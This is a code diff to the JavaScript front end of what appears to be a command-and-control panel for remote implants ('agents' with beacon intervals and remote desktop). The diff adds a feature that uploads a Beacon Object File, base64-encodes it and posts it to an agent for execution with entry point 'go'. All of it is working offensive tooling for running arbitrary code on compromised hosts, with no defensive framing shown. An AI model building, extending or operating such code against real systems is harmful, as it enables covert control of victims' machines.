@@ -342,6 +342,9 @@
                 case 'desktop':
                     openDesktop(selectedAgentId);
                     break;
+                case 'bof':
+                    document.getElementById('bof-file').click();
+                    break;
                 case 'sleep':
                     var interval = prompt('Beacon interval (seconds):');
                     if (interval) await api('POST', '/agents/' + selectedAgentId + '/sleep', { interval: parseInt(interval) });
@@ -650,6 +653,18 @@
     document.getElementById('desktop-send').addEventListener('click', function() {
         var text = document.getElementById('desktop-type').value;
         if (text) desktopAction('type ' + text);
+    });
+    document.getElementById('bof-file').addEventListener('change', function(e) {
+        var file = e.target.files && e.target.files[0];
+        e.target.value = '';
+        if (!file || !selectedAgentId) return;
+        var reader = new FileReader();
+        reader.onload = async function() {
+            var b64 = String(reader.result).split(',')[1] || '';
+            var result = await api('POST', '/agents/' + selectedAgentId + '/bof', { bof_data: b64, args: '', entry: 'go' });
+            addEventLog('bof', selectedAgentId + ': ' + (result.output || 'queued'));
+        };
+        reader.readAsDataURL(file);
     });
     document.getElementById('desktop-start').addEventListener('click', function() { desktopAction('start'); });
     document.getElementById('desktop-frame').addEventListener('click', function() { desktopAction('frame'); });
